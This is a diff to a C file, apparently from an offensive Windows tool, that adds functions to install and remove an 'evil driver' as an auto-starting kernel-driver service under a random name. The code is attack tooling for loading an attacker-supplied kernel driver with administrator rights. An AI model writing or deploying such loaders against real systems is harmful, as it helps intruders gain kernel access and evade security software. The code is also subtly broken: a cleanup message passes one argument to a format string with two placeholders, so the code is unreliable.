@@ -115,3 +115,55 @@ BOOL IsDriverServiceRunning(LPTSTR driverPath, LPTSTR* serviceName) {
     }
     return isRunning;
 }
+
+/*
+
+--- Evil driver install / uninstall functions.
+
+*/
+
+TCHAR* g_evilDriverServiceName;
+
+TCHAR* GetEvilDriverServiceName(void) {
+    if (!g_evilDriverServiceName || _tcslen(g_evilDriverServiceName) == 0) {
+        g_evilDriverServiceName = allocAndGenerateRandomString(SERVICE_NAME_LENGTH);
+    }
+    return g_evilDriverServiceName;
+}
+
+void SetEvilDriverServiceName(_In_z_ TCHAR* newName) {
+    if (g_evilDriverServiceName) {
+        free(g_evilDriverServiceName);
+    }
+    g_evilDriverServiceName = _tcsdup(newName);
+
+    if (!g_evilDriverServiceName) {
+        _putts_or_not(TEXT("[!] Error while attempting to set the service name."));
+        return;
+    }
+}
+
+BOOL InstallEvilDriver(TCHAR* driverPath) {
+    TCHAR* svcName = GetEvilDriverServiceName();
+
+    DWORD status = ServiceInstall(svcName, svcName, driverPath, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE);
+
+    if (status == 0x00000005) {
+        _putts_or_not(TEXT("[!] 0x00000005 - Access Denied when attempting to install the driver - Did you run as administrator?"));
+    }
+    _tprintf_or_not(TEXT("[!] The evil service should be manually deleted when you are done with it : \ncmd /c sc stop %s\ncmd /c sc delete %s\n"), GetEvilDriverServiceName());
+
+    return status == 0x0;
+}
+
+BOOL UninstallEvilDriver(void) {
+    TCHAR* svcName = GetEvilDriverServiceName();
+    
+    BOOL status = ServiceUninstall(svcName, 0);
+
+    if (!status) {
+        PRINT_ERROR_AUTO(TEXT("ServiceUninstall"));
+    }
+
+    return status;
+}
